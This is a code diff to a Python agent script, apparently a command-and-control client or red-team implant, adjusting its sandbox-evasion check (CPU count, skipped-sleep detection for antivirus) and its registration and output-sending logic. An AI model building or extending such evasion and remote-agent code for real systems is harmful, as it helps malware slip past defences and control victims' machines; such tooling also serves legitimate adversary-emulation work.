@@ -1,5 +1,6 @@
 import configparser
 import datetime
+import sys
 from getpass import getuser
 import os
 import platform
@@ -238,16 +239,12 @@ def confirm_kill():
 def sandbox_evasion():
     # SANDBOX 1 :Check number of CPU core
     if os.cpu_count() >= 2:
-
         # Get the current time
         now = datetime.datetime.now()
-
         # Stop code execution for 1 seconds
         time.sleep(1)
-
         # Get the time after 2 seconds
         now2 = datetime.datetime.now()
-
         # SANDBOX 2 :Check if AV skipped sleep function
         if (now2 - now) > datetime.timedelta(seconds=1):
             print('Run')
@@ -259,18 +256,16 @@ if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
 
-    # Getting agent id
+    # Agent obtaining and ID
     if not os.path.exists(path=THIS_DIR / 'config.ini'):
         agent_id = randrange(500)
+        register()
     else:
         agent_config = configparser.ConfigParser()
         agent_config.read('config.ini')
-        agent_id = agent_config['AGENT']['id']
-    # print(agent_id)
-    # techs = get_techniques()
-    # print(techs)
-    # results = download_and_run_commands()
-    # print(results)
-    register()
+        agent_id = agent_config['AGENT']['id'] if 'id' in agent_config['AGENT'] \
+            else sys.exit('[+] Agent has no ID.\n[+] Agent Stopped!!')
+        print('[+] Agent already registered')
+
     send_output()
     config_file()
